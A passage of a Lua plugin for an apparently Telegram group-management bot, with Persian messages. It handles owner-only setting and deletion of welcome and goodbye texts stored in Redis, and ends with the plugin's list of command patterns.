            return "متن خروج کاربر تغییر کرد به:\n"..text
        end
		if matches[1] == "chat_del_user" or matches[1] == "channel_kick" or matches[1] == "kick_user" then
		    send = redis:get("bye:"..msg.to.id)
			if send then
                return send
            elseif not send then
                return
            end
        end
		if matches[1] == "delbye" then
		    if not is_owner(msg) then
			    return "فقط مخصوص مدیر گروه"
			end
			say = "متن خروج با موفقیت حذف شد"
			if redis:get("bye:"..msg.to.id) then
                redis:del("bye:"..msg.to.id)
                send_msg(get_receiver(msg), say, ok_cb, false)
            else
                return "متن خروج کاربر تنظیم نشده است"
            end
        end
	   --Setbye.
	   --Setwlc:
	    if matches[1] == 'setwlc' and matches[2] then
	        if not is_owner(msg) then
			    return "فقط مخصوص مدیر گروه"
			end
			redis:set('wlc:'..msg.to.id, matches[2])
            return 'متن خوش آمد گویی گروه تنظیم شد به : \n'..matches[2]
	    end
		if matches[1] == 'delwlc' then
		    if not is_owner(msg) then
			    return "فقط مخصوص مدیر گروه"
			end	
			redis:del('wlc:'..msg.to.id)
            return 'متن خوش آمد گویی با موفقیت حذف شد'
		end
		if matches[1] == 'chat_add_user' or matches[1] == 'chat_add_user_link' or matches[1] == 'channel_invite' then
		    send = redis:get("wlc:"..msg.to.id)
			if send then
                return send
            elseif not send then
                return
            end
	    end
	   --Setwlc.
end

return {
  advan = {
   "Created by: @janlou",
   "Powered by: @AdvanTeam",
   "CopyRight all right reserved",
  },
  patterns = {
 "^[!/#]([Ff]ile) (.*) (.*)$",
 "^[!/#](save) (.*)$",
 "^[!/#]([Nn]ote) (.*)$",
 "^[!/#]([Mm]ynote)$",
 "^[!/#](tosticker)$",
 "^[!/#](tophoto)$",
 "^[!/#](leave)$",
 "^[!/#]([Aa]ddsudo)$",
 "^[!/#]([Ff]ilter) (.*)$",
 "^[!/#]([Uu]nfilter) (.*)$",
 "^[!/#]([Ff]ilterlist)$",
 "^[!/#](addplug) (.*) ([^%s]+)$",
 "^[!/#](delplug) (.*)$",
 "^[!/#]([Ss]etsudo) (%d+)$",
 "^[!/#]([Rr]msg) (%d*)$",
 "^[!/#](setteam) (.*) (.*)$",
 "^[!/#]([Vv]ersion)$",
 "^[!/#]([Cc]onfig) (%d+)$",
 "^[!/#]([Cc]lean) (.*)$",
 "^[!/#]([Bb]old) (.*)$",
 "^[!/#]([Ii]talic) (.*)$",
 "^[!/#]([Cc]ode) (.*)$",
 "^[!/#]([Hh]yper) (.*) (.*)$",
 "^[!/#](setwlc) +(.*)$",
 "^[!/#](delwlc)$",
 "^[!/#]([Ss]etbye) (.*)$",
 "^[!/#]([Dd]elbye)$",
 "^[!/#][Rr][Aa][Tt][Ee]$",
 "^[!/#][Aa][Dd][Vv][Aa][Nn]$",
 "^[!/#](lock) (.*)$",
 "^[!/#](unlock) (.*)$",
 "/[Ss][Tt][Aa][Rr][Tt]",
 "^!!tgservice (chat_del_user)$",
 "^!!tgservice (channel_kick)$",
 "^!!tgservice (kick_user)$",
 "^!!tgservice (chat_add_user)$",
 "^!!tgservice (channel_invite)$",
 "^!!tgservice (chat_add_user_link)$",
 "%[(document)%]",
 "%[(photo)%]",
 "^!!tgservice (.+)$",
 "^(.+)$"
  },
  run = run,
}
